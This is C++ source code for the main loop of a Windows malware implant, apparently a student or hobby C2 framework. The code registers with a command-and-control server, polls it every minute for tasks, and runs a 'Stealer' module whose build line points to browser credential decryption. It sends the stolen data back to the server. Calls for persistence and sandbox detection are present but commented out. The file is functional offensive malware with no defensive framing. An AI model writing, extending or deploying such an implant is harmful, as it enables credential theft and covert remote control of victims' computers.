#include "implant.h"

#define IMPLANT_ID 1

//Implement Injection
//Implement Gatherinfo
//Implement Dropper
//Implement sendtoC2

//FileExec
//SitAware
//FileEnum

//x86_64-w64-mingw32-g++ implant.cpp stealer/stealer.cpp stealer/SQLfunctions.cpp stealer/sqlite3.o stealer/aes_gcm.cpp http/http.cpp persist/persist.cpp  -lwinhttp  -lbcrypt -lcrypt32  -static -luserenv -o implant.exe 

void IWillRunForever(void){
    
    /* THIS IS GETTING US COMMANDS EVERY MINUTE */
    std::string new_item = HttpGetCommand("/get_commands", IMPLANT_ID);
    json converted_new_item = json::parse(new_item);
    int num_of_tasks = converted_new_item.size();
    for(int i = 0; i < num_of_tasks; i++){
        /* Only execute commands that are untouched */
        std::string command = converted_new_item.at(i).at(2);
        execute(command, converted_new_item.at(i).at(0));
    }
        

    Sleep(60000);
}

void registerimplant(void){
    std::string jitter = std::to_string(5);
    std::string sleep = std::to_string(60000);
    HttpRegisterImplant("/register_implant", jitter, sleep);
    return;
}

void execute(std::string command, int task_id){

    /* Stealer Function */
    json data_from_driver;
    std::string results;
    if(command.compare("Stealer") == 0){
        printf("Executing Stealer");
        data_from_driver = driver();
        results = data_from_driver.dump();

        /* Send the response back to the server */
        HttpResponse("/response", IMPLANT_ID, task_id, results, "success", command);
    }


}

int main(int argc, char* argv[]){

    /* Registering Implant */
    registerimplant();

    /* HOW ARE WE GETTING IMPLANT ID?*/

    /* Persistance */
    // before publishing - the bat file needs to load the implant.exe
    // persist_execution();

    /* Sandbox Detection */
    // if (vmCheck() || vmDriverCheck() || sandboxTimeCheck()) {
    // 	exit(0);
    // }

    /* Receive Tasks, Execute Tasks, Send Back Tasks */
    IWillRunForever();



    
    /* for sake of testing*/
    std::string new_item = "[[3,1,\"Stealer\",\"Fri, 09 Dec 2022 23:41:29 GMT\",\"untouched\",null,null,null,\"test\"]]";
    json converted_new_item = json::parse(new_item);
    std::string command = converted_new_item.at(0).at(2);
    std::cout << command << std::endl;
    
    

    //std::string command = "Stealer";
    json data_from_driver;
    std::string results;
    std::cout << HttpResponse("/response", IMPLANT_ID, 3, results, "success", command) << std::endl;

    // Stealer function works
    // if(command.compare("Stealer") == 0){
    //     printf("Executing Stealer");
    //     data_from_driver = driver();
    //     results = data_from_driver.dump();
    // }


    return 0;
}